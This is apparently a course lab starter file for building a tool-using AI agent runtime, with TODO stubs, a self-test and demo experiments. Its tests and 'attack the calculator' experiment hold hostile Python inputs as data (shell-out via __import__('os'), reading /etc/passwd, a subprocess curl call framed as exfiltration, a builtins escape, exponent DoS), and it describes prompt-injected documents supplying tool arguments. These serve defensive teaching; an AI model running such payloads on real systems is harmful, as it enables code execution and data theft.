"""
starter.py - Lab 9: Build a Tool-Using Agent

Replace each TODO with working code. The self-test checks your work.

    python starter.py

PART 1 (tasks 1-5) is pure standard library - no packages, no API key.
You will build a complete agent runtime: schema generation by introspection,
argument validation, a calculator that cannot be used to run arbitrary code,
and the tool-calling loop with a hard iteration cap.

PART 2 (in the lab brief) connects it to a real model.
"""

import ast
import inspect
import operator


# ======================================================================
# TASK 1 - make_tool_schema
# Module 9, section 9.3
# ======================================================================

# Python type annotation -> JSON Schema type name.
TYPE_MAP = {str: "string", int: "integer", float: "number", bool: "boolean"}


def make_tool_schema(func) -> dict:
    """Build a tool schema by inspecting a Python function.

    The model needs a name, a description of WHEN to use the tool, and a typed
    parameter list. All three can be read straight off the function - which is
    why docstrings stopped being documentation in Module 2 and became
    load-bearing here.

    Args:
        func: A function with type annotations and a docstring.

    Returns:
        {
          "name": <function name>,
          "description": <first paragraph of the docstring, one line>,
          "parameters": {
              "type": "object",
              "properties": {<arg>: {"type": <json type>, ...}},
              "required": [<args with no default>]
          }
        }

        Arguments WITH a default also carry a "default" key, and are not
        listed as required.

    Examples:
        >>> def add(a: int, b: int) -> int:
        ...     '''Add two integers.'''
        ...     return a + b
        >>> schema = make_tool_schema(add)
        >>> schema["name"], schema["description"]
        ('add', 'Add two integers.')
        >>> schema["parameters"]["required"]
        ['a', 'b']
    """
    # TODO:
    #   1. signature = inspect.signature(func)
    #   2. Take the docstring with inspect.getdoc(func) (falls back to "").
    #      The description is its FIRST PARAGRAPH - split on "\n\n", take [0],
    #      strip it, and replace any remaining "\n" with " " so it is one line.
    #   3. For each parameter:
    #        - map its annotation through TYPE_MAP, defaulting to "string"
    #        - if param.default is inspect.Parameter.empty -> it is required
    #        - otherwise record {"default": param.default}
    #   4. Assemble and return the dict described above.
    return {}


# ======================================================================
# TASK 2 - ToolRegistry
# Module 9, sections 9.3 and 9.4
# ======================================================================

class ToolRegistry:
    """Holds the tools an agent may call, and dispatches to them by name.

    A registry rather than a bare dict because the agent needs three things:
    the schemas (to send to the model), a lookup (to dispatch), and a single
    place to enforce policy (section 9.12).
    """

    def __init__(self):
        self.tools = {}       # name -> callable
        self.schemas = {}     # name -> schema dict

    def register(self, func):
        """Add a function as a tool. Returns the function unchanged.

        Returning func means this also works as a decorator:

            @registry.register
            def my_tool(x: int) -> int:
                '''Does a thing.'''
                return x
        """
        # TODO:
        #   1. schema = make_tool_schema(func)
        #   2. Store the callable in self.tools under schema["name"]
        #   3. Store the schema in self.schemas under the same key
        #   4. return func
        return func

    def list_schemas(self) -> list:
        """Return every registered schema, for sending to the model."""
        # TODO: return the schemas as a list.
        return []

    def call(self, name: str, arguments: dict):
        """Look up and invoke a tool.

        Args:
            name:      The tool name the model asked for.
            arguments: The arguments the model supplied.

        Returns:
            Whatever the tool returns.

        Raises:
            KeyError:   if no such tool is registered.
            ValueError: if the arguments fail validation.

        The order matters: check the tool EXISTS, then VALIDATE the arguments,
        and only then execute. Validating after executing is not validating.
        """
        # TODO:
        #   1. If name not in self.tools, raise KeyError(f"unknown tool: {name}")
        #   2. Validate with validate_arguments(self.schemas[name], arguments).
        #      If invalid, raise ValueError with the problems joined by "; ".
        #   3. Only now: return self.tools[name](**arguments)
        raise NotImplementedError


# ======================================================================
# TASK 3 - validate_arguments
# Module 9, section 9.12 - treat model output as untrusted input
# ======================================================================

def _type_matches(value, expected: str) -> bool:
    """Does a value match a JSON Schema type name?"""
    if expected == "string":
        return isinstance(value, str)
    if expected == "integer":
        # bool is a subclass of int in Python, so exclude it explicitly or
        # True would pass as a valid integer.
        return isinstance(value, int) and not isinstance(value, bool)
    if expected == "number":
        return isinstance(value, (int, float)) and not isinstance(value, bool)
    if expected == "boolean":
        return isinstance(value, bool)
    return True          # unknown type name - do not block on it


def validate_arguments(schema: dict, arguments: dict) -> tuple:
    """Check model-generated arguments against a tool's schema.

    The model is a text predictor influenced by everything in its context,
    including retrieved documents an attacker may control. Its arguments are
    untrusted input (section 9.12).

    Args:
        schema:    A schema from make_tool_schema.
        arguments: What the model supplied.

    Returns:
        (is_valid, problems) - problems is a list of human-readable strings.

    Three checks: every required argument is present, no unexpected arguments
    were supplied, and every value has the declared type.

    Examples:
        >>> s = {"parameters": {"type": "object",
        ...                     "properties": {"a": {"type": "integer"}},
        ...                     "required": ["a"]}}
        >>> validate_arguments(s, {"a": 1})
        (True, [])
        >>> ok, problems = validate_arguments(s, {})
        >>> ok, len(problems)
        (False, 1)
    """
    problems = []

    # TODO:
    #   1. If arguments is not a dict, return (False, [one problem]) at once -
    #      the checks below all assume a mapping.
    #   2. Pull properties and required out of schema["parameters"].
    #   3. For each required name missing from arguments: one problem.
    #   4. For each supplied name:
    #        - not in properties          -> "unexpected argument: <name>", continue
    #        - wrong type (_type_matches) -> "argument <name> must be <type>, got <t>"
    #   5. Return (not problems, problems).

    return (not problems, problems)


# ======================================================================
# TASK 4 - safe_calculate
# Module 9, section 9.12 - the eval() lesson
# ======================================================================

ALLOWED_BINARY = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv,
    ast.Mod: operator.mod,
    ast.Pow: operator.pow,
}
ALLOWED_UNARY = {ast.UAdd: operator.pos, ast.USub: operator.neg}
MAX_EXPONENT = 1000


def safe_calculate(expression: str) -> float:
    """Evaluate an arithmetic expression WITHOUT executing arbitrary code.

    The naive version of this tool is:

        def calculator(expression): return eval(expression)

    which is remote code execution handed to a text predictor. The model does
    not even have to be malicious - a prompt-injected document can supply the
    expression (Module 5, section 5.11).

    This version parses to an abstract syntax tree and walks it, permitting
    ONLY numeric literals and arithmetic operators. Note the shape of the
    defence: an ALLOWLIST. Trying to blocklist dangerous patterns is a losing
    game because you will not enumerate them all.

    Args:
        expression: An arithmetic expression, e.g. "17 * 23 * 41".

    Returns:
        The numeric result.

    Raises:
        ValueError: on anything that is not plain arithmetic.

    Examples:
        >>> safe_calculate("2+2")
        4
        >>> safe_calculate("(2+3)*4")
        20
        >>> safe_calculate("__import__('os').system('rm -rf /')")
        Traceback (most recent call last):
        ValueError: expression element not allowed: Call
    """
    # TODO:
    #   1. Reject a non-string or blank expression with ValueError.
    #   2. tree = ast.parse(expression, mode="eval")
    #      Wrap it: a SyntaxError should become a ValueError, so callers only
    #      have one exception type to handle.
    #   3. return _evaluate_node(tree.body)
    raise NotImplementedError


def _evaluate_node(node):
    """Recursively evaluate an allowlisted AST node.

    Raises:
        ValueError: for any node type or operator not on the allowlist.
    """
    # TODO:
    #   ast.Constant:
    #     - reject bool (it is a subclass of int) and anything not int/float
    #     - otherwise return node.value
    #
    #   ast.BinOp:
    #     - operation = type(node.op); reject if not in ALLOWED_BINARY
    #     - evaluate node.left and node.right recursively
    #     - if Pow and abs(right) > MAX_EXPONENT -> reject
    #       (2 ** 100000000 is a denial-of-service, not a calculation)
    #     - if Div/FloorDiv/Mod and right == 0 -> reject with "division by zero"
    #     - otherwise apply ALLOWED_BINARY[operation]
    #
    #   ast.UnaryOp:
    #     - same pattern with ALLOWED_UNARY (this is what makes "-5" work)
    #
    #   ANYTHING ELSE:
    #     - raise ValueError(f"expression element not allowed: {type(node).__name__}")
    #       Calls, names, attributes, subscripts, lists, strings - all refused.
    raise NotImplementedError


# ======================================================================
# TASK 5 - run_agent_loop
# Module 9, sections 9.2 and 9.12
# ======================================================================

class ScriptedModel:
    """A deterministic stand-in for a real model.

    Real models are stochastic, so they cannot be used in unit tests. This
    replays a fixed script, which lets you test the LOOP's wiring separately
    from the model's judgement.

    Each script entry is one of:
        {"type": "tool_call", "name": str, "arguments": dict}
        {"type": "final", "content": str}
    """

    def __init__(self, script: list):
        self.script = list(script)
        self.call_count = 0
        self.seen_messages = []

    def decide(self, messages: list) -> dict:
        """Return the next scripted decision."""
        self.call_count += 1
        self.seen_messages.append(list(messages))
        if not self.script:
            # An exhausted script means the test wanted the loop to run out.
            return {"type": "tool_call", "name": "noop", "arguments": {}}
        return self.script.pop(0)


def run_agent_loop(model, registry: ToolRegistry, question: str,
                   max_iterations: int = 5) -> dict:
    """Run the tool-calling loop until the model answers or we stop it.

    Args:
        model:          Anything with .decide(messages) -> decision dict.
        registry:       The tools the agent may call.
        question:       The user's question.
        max_iterations: HARD CAP on loop iterations. Not optional - a
                        confused agent will otherwise loop indefinitely
                        (section 9.12).

    Returns:
        {
          "answer": str,            the final answer, or a stopped message
          "trace": list,            one entry per tool call
          "iterations": int,        how many times the model was consulted
          "stopped_early": bool     True if the cap was hit
        }

        Each trace entry is:
          {"tool": name, "arguments": {...}, "observation": str}

    Tool failures must NOT crash the loop. An unknown tool, invalid arguments
    or a raising tool all become an "Error: ..." observation fed back to the
    model, which can often recover.
    """
    messages = [{"role": "user", "content": question}]
    trace = []

    # TODO:
    #   for iteration in range(1, max_iterations + 1):
    #       decision = model.decide(messages)
    #
    #       if decision["type"] == "final":
    #           return {"answer": decision["content"], "trace": trace,
    #                   "iterations": iteration, "stopped_early": False}
    #
    #       # It is a tool call.
    #       name = decision["name"]; arguments = decision.get("arguments", {})
    #       try:
    #           observation = str(registry.call(name, arguments))
    #       except Exception as exc:
    #           # Return the MESSAGE, not the traceback: a traceback in the
    #           # transcript leaks file paths and internals into the context.
    #           observation = f"Error: {type(exc).__name__}: {exc}"
    #
    #       trace.append({"tool": name, "arguments": arguments,
    #                     "observation": observation})
    #       messages.append({"role": "assistant",
    #                        "content": f"Calling {name} with {arguments}"})
    #       messages.append({"role": "tool", "name": name, "content": observation})
    #
    #   # Fell out of the loop without a final answer.
    #   return {"answer": "Stopped: reached the maximum number of iterations.",
    #           "trace": trace, "iterations": max_iterations,
    #           "stopped_early": True}
    return {"answer": "", "trace": [], "iterations": 0, "stopped_early": False}


# ======================================================================
# Example tools, used by the tests and demos
# ======================================================================

def build_demo_registry() -> ToolRegistry:
    """A small tool set: one compute tool, one lookup, one that always fails."""
    registry = ToolRegistry()

    @registry.register
    def calculator(expression: str) -> float:
        """Evaluate an arithmetic expression exactly.

        Use this for ANY arithmetic. Do not attempt calculations yourself.

        Args:
            expression: An arithmetic expression, e.g. "17 * 23".
        """
        return safe_calculate(expression)

    @registry.register
    def get_revenue(year: int) -> int:
        """Look up total company revenue for a given year, in whole pounds.

        Use for questions about our own historical revenue figures.
        Do NOT use for forecasts or for other companies.

        Args:
            year: A four-digit year.
        """
        table = {2022: 3_100_000, 2023: 3_800_000, 2024: 4_200_000}
        if year not in table:
            raise ValueError(f"no revenue data for {year}; have 2022-2024")
        return table[year]

    @registry.register
    def flaky_service(query: str) -> str:
        """A deliberately broken tool, for testing error handling.

        Args:
            query: Anything.
        """
        raise RuntimeError("service unavailable")

    return registry


# ======================================================================
# SELF-TEST - do not edit
# ======================================================================

def _run_self_test() -> int:
    checks = []

    def check(name, got, expected):
        checks.append((name, got, expected))

    def check_raises(name, fn, exception=ValueError):
        try:
            fn()
            checks.append((name, "did not raise", f"raised {exception.__name__}"))
        except exception:
            checks.append((name, f"raised {exception.__name__}",
                           f"raised {exception.__name__}"))
        except NotImplementedError:
            checks.append((name, "not implemented", f"raised {exception.__name__}"))
        except Exception as exc:
            checks.append((name, f"raised {type(exc).__name__}",
                           f"raised {exception.__name__}"))

    # --- TASK 1 ---
    def add(a: int, b: int) -> int:
        """Add two integers."""
        return a + b

    def greet(name: str, greeting: str = "Hello") -> str:
        """Greet someone by name.

        Args:
            name: Who to greet.
        """
        return f"{greeting}, {name}"

    schema = make_tool_schema(add)
    check("1. schema name", schema.get("name"), "add")
    check("1. schema description from docstring",
          schema.get("description"), "Add two integers.")
    check("1. schema property types",
          schema.get("parameters", {}).get("properties"),
          {"a": {"type": "integer"}, "b": {"type": "integer"}})
    check("1. schema required list",
          schema.get("parameters", {}).get("required"), ["a", "b"])

    greet_schema = make_tool_schema(greet)
    check("1. description is only the FIRST paragraph",
          greet_schema.get("description"), "Greet someone by name.")
    check("1. defaulted argument is not required",
          greet_schema.get("parameters", {}).get("required"), ["name"])
    check("1. defaulted argument records its default",
          greet_schema.get("parameters", {}).get("properties", {})
          .get("greeting", {}).get("default"), "Hello")

    # --- TASK 3 (before 2, which depends on it) ---
    int_schema = {"parameters": {"type": "object",
                                 "properties": {"a": {"type": "integer"}},
                                 "required": ["a"]}}
    check("3. validate accepts a correct argument",
          validate_arguments(int_schema, {"a": 1}), (True, []))

    for label, args, expected_count in [
        ("missing required", {}, 1),
        ("unexpected argument", {"a": 1, "b": 2}, 1),
        ("wrong type", {"a": "one"}, 1),
        ("bool is not an integer", {"a": True}, 1),
    ]:
        ok, problems = validate_arguments(int_schema, args)
        check(f"3. validate rejects: {label}", (ok, len(problems)), (False, expected_count))

    ok, problems = validate_arguments(int_schema, "not a dict")
    check("3. validate rejects a non-object", (ok, len(problems) >= 1), (False, True))

    # --- TASK 2 ---
    registry = build_demo_registry()
    check("2. registry registered three tools", len(registry.list_schemas()), 3)
    check("2. registry exposes schema names",
          sorted(s.get("name", "?") for s in registry.list_schemas()),
          ["calculator", "flaky_service", "get_revenue"])

    try:
        check("2. registry.call dispatches", registry.call("get_revenue", {"year": 2024}),
              4_200_000)
    except NotImplementedError:
        check("2. registry.call dispatches", "not implemented", 4_200_000)

    check_raises("2. registry.call rejects an unknown tool",
                 lambda: registry.call("no_such_tool", {}), KeyError)
    check_raises("2. registry.call rejects invalid arguments",
                 lambda: registry.call("get_revenue", {"year": "twenty"}), ValueError)

    # SECURITY: validation must happen BEFORE execution.
    executed = {"flag": False}
    probe = ToolRegistry()

    @probe.register
    def record(value: int) -> str:
        """Record a value."""
        executed["flag"] = True
        return "recorded"

    try:
        probe.call("record", {"value": "not an int"})
    except Exception:
        pass
    check("2. invalid arguments prevent EXECUTION, not just return an error",
          executed["flag"], False)

    # --- TASK 4 ---
    for expression, expected in [
        ("2+2", 4), ("17*23", 391), ("17*23*41", 16031), ("(2+3)*4", 20),
        ("-5+3", -2), ("10/4", 2.5), ("10//4", 2), ("7%3", 1), ("2**10", 1024),
    ]:
        try:
            check(f"4. safe_calculate({expression!r})", safe_calculate(expression), expected)
        except NotImplementedError:
            check(f"4. safe_calculate({expression!r})", "not implemented", expected)

    for label, expression in [
        ("__import__ / RCE", "__import__('os').system('echo pwned')"),
        ("file access", "open('/etc/passwd').read()"),
        ("bare function call", "print(1)"),
        ("variable name", "x + 1"),
        ("list literal", "[1,2,3]"),
        ("string arithmetic", "'a'*5"),
        ("boolean literal", "True+1"),
        ("exponent DoS", "2**100000"),
        ("division by zero", "1/0"),
        ("syntax error", "2 +* 3"),
        ("empty expression", "   "),
    ]:
        check_raises(f"4. safe_calculate BLOCKS: {label}",
                     lambda e=expression: safe_calculate(e), ValueError)

    # --- TASK 5 ---
    registry = build_demo_registry()

    result = run_agent_loop(
        ScriptedModel([{"type": "final", "content": "42"}]), registry, "Q")
    check("5. immediate final answer", result.get("answer"), "42")
    check("5. immediate final makes no tool calls", len(result.get("trace", [])), 0)
    check("5. immediate final took one iteration", result.get("iterations"), 1)

    result = run_agent_loop(ScriptedModel([
        {"type": "tool_call", "name": "get_revenue", "arguments": {"year": 2024}},
        {"type": "final", "content": "Revenue was 4200000"},
    ]), registry, "Q")
    check("5. one tool call then answer", result.get("answer"), "Revenue was 4200000")
    check("5. trace records the call", len(result.get("trace", [])), 1)
    check("5. trace records the observation",
          result.get("trace", [{}])[0].get("observation"), "4200000")

    # Chaining: the second call uses what the first found.
    result = run_agent_loop(ScriptedModel([
        {"type": "tool_call", "name": "get_revenue", "arguments": {"year": 2024}},
        {"type": "tool_call", "name": "calculator",
         "arguments": {"expression": "4200000 * 0.18"}},
        {"type": "final", "content": "756000"},
    ]), registry, "Q")
    check("5. chains two tool calls", len(result.get("trace", [])), 2)
    check("5. second call's observation is correct",
          result.get("trace", [{}, {}])[1].get("observation"), "756000.0")

    # THE GUARDRAIL: a model that never finalises must be stopped.
    result = run_agent_loop(ScriptedModel([]), registry, "Q", max_iterations=3)
    check("5. iteration cap stops a runaway loop",
          result.get("stopped_early"), True)
    check("5. iteration cap is respected exactly",
          result.get("iterations"), 3)
    check("5. runaway loop still returns a trace", len(result.get("trace", [])), 3)

    # Errors become observations, not crashes.
    result = run_agent_loop(ScriptedModel([
        {"type": "tool_call", "name": "nonexistent", "arguments": {}},
        {"type": "final", "content": "recovered"},
    ]), registry, "Q")
    check("5. unknown tool does not crash the loop", result.get("answer"), "recovered")
    check("5. unknown tool becomes an error observation",
          "Error" in result.get("trace", [{}])[0].get("observation", ""), True)

    result = run_agent_loop(ScriptedModel([
        {"type": "tool_call", "name": "flaky_service", "arguments": {"query": "x"}},
        {"type": "final", "content": "recovered"},
    ]), registry, "Q")
    check("5. raising tool does not crash the loop", result.get("answer"), "recovered")
    check("5. raising tool becomes an error observation",
          "service unavailable" in result.get("trace", [{}])[0].get("observation", ""),
          True)

    result = run_agent_loop(ScriptedModel([
        {"type": "tool_call", "name": "get_revenue", "arguments": {"year": "twenty"}},
        {"type": "final", "content": "recovered"},
    ]), registry, "Q")
    check("5. invalid arguments become an error observation",
          "Error" in result.get("trace", [{}])[0].get("observation", ""), True)

    # --- report ---
    print()
    print("=" * 76)
    print("  LAB 9 SELF-TEST - the agent runtime")
    print("=" * 76)
    print()

    failures = 0
    for name, got, expected in checks:
        if got == expected:
            print(f"[ OK ]  {name}")
        else:
            failures += 1
            print(f"[FAIL]  {name}")
            print(f"          got:      {got!r}")
            print(f"          expected: {expected!r}")

    print()
    print("-" * 76)
    if failures == 0:
        print(f"  All {len(checks)} checks passed.")
        print("  You have built a complete agent runtime, including the two")
        print("  guardrails that matter most: argument validation before")
        print("  execution, and a hard cap on the loop.")
    else:
        print(f"  {failures} of {len(checks)} failing.")
        print("  Order: 1 (schema), 3 (validation), 2 (registry, needs both),")
        print("  4 (calculator), 5 (loop).")
    print("-" * 76)
    print()
    return failures


# ======================================================================
# EXPERIMENTS
# ======================================================================

def experiment_attack_the_calculator():
    print("=" * 76)
    print("  EXPERIMENT 1: attacking your own calculator")
    print("=" * 76)
    print()
    print("  These are the expressions a prompt-injected document might supply.")
    print("  With eval() every one of them would execute.")
    print()

    attacks = [
        ("legitimate arithmetic", "17 * 23 * 41"),
        ("legitimate, with parens", "(4200000 * 18) / 100"),
        ("import and shell out", "__import__('os').system('echo pwned')"),
        ("read a private file", "open('/etc/passwd').read()"),
        ("exfiltrate via subprocess", "__import__('subprocess').run(['curl','x.com'])"),
        ("reach into builtins", "().__class__.__bases__[0].__subclasses__()"),
        ("denial of service", "2 ** 100000000"),
        ("division by zero", "1/0"),
        ("smuggle a string", "'x' * 999999999"),
    ]

    for label, expression in attacks:
        try:
            value = safe_calculate(expression)
            print(f"  [RAN    ] {label:<28} = {value}")
        except NotImplementedError:
            print("  safe_calculate not implemented yet.")
            print()
            return
        except ValueError as exc:
            print(f"  [BLOCKED] {label:<28} {exc}")

    print()
    print("  Only the two legitimate expressions ran. Everything else was")
    print("  refused - not because it matched a list of known attacks, but")
    print("  because it was not on the ALLOWLIST of permitted AST nodes.")
    print()
    print("  That is the important distinction. A blocklist would need to")
    print("  anticipate every attack; an allowlist only needs to know what")
    print("  arithmetic looks like.")
    print()


def experiment_agent_traces():
    print("=" * 76)
    print("  EXPERIMENT 2: agent traces, including the failures")
    print("=" * 76)
    print()

    registry = build_demo_registry()

    scenarios = [
        ("answers directly, no tools",
         [{"type": "final", "content": "Paris is the capital of France."}]),

        ("chains two tools (revenue, then 18% of it)",
         [{"type": "tool_call", "name": "get_revenue", "arguments": {"year": 2024}},
          {"type": "tool_call", "name": "calculator",
           "arguments": {"expression": "4200000 * 0.18"}},
          {"type": "final", "content": "18% of last year's revenue is 756,000."}]),

        ("recovers from a bad year, then succeeds",
         [{"type": "tool_call", "name": "get_revenue", "arguments": {"year": 1999}},
          {"type": "tool_call", "name": "get_revenue", "arguments": {"year": 2023}},
          {"type": "final", "content": "The earliest year I have is 2023: 3,800,000."}]),

        ("hits the iteration cap", []),
    ]

    for label, script in scenarios:
        result = run_agent_loop(ScriptedModel(script), registry, "Q", max_iterations=3)
        if result.get("iterations") == 0:
            print("  run_agent_loop not implemented yet.")
            print()
            return

        print(f"  SCENARIO: {label}")
        for step, entry in enumerate(result["trace"], 1):
            print(f"    step {step}: {entry['tool']}({entry['arguments']})")
            print(f"            -> {entry['observation'][:64]}")
        flag = "  [STOPPED EARLY]" if result["stopped_early"] else ""
        print(f"    answer: {result['answer'][:60]}{flag}")
        print(f"    iterations: {result['iterations']}")
        print()

    print("  The third scenario is the one worth studying. The agent asked for")
    print("  a year with no data, got a USEFUL error back as an observation,")
    print("  and corrected itself on the next turn.")
    print()
    print("  That only works because tool failures are returned to the model")
    print("  instead of crashing the loop. A raised exception would have thrown")
    print("  away information the agent could act on.")
    print()
    print("  The fourth shows the cap doing its job. Without it, a model that")
    print("  never says 'final' runs until your budget does.")
    print()


def experiment_tool_descriptions():
    print("=" * 76)
    print("  EXPERIMENT 3: what the model actually sees")
    print("=" * 76)
    print()

    registry = build_demo_registry()
    schemas = registry.list_schemas()
    if not schemas:
        print("  ToolRegistry not implemented yet.")
        print()
        return

    for schema in schemas:
        print(f"  {schema['name']}")
        print(f"    description: {schema['description']}")
        properties = schema["parameters"]["properties"]
        required = schema["parameters"]["required"]
        for arg, spec in properties.items():
            marker = "required" if arg in required else f"default={spec.get('default')!r}"
            print(f"    arg {arg}: {spec['type']} ({marker})")
        print()

    print("  This is the entire basis on which the model chooses a tool. Note")
    print("  that get_revenue's description says what it is NOT for - that")
    print("  negative guidance is often what disambiguates it from a")
    print("  forecasting or competitor-lookup tool.")
    print()
    print("  All of it came from introspecting the function. The docstring IS")
    print("  the description, which is why a vague docstring is a routing bug.")
    print()


if __name__ == "__main__":
    failures = _run_self_test()
    if failures == 0:
        experiment_attack_the_calculator()
        experiment_agent_traces()
        experiment_tool_descriptions()
    else:
        print("  Fix the self-test first, then the experiments will run.")
        print()
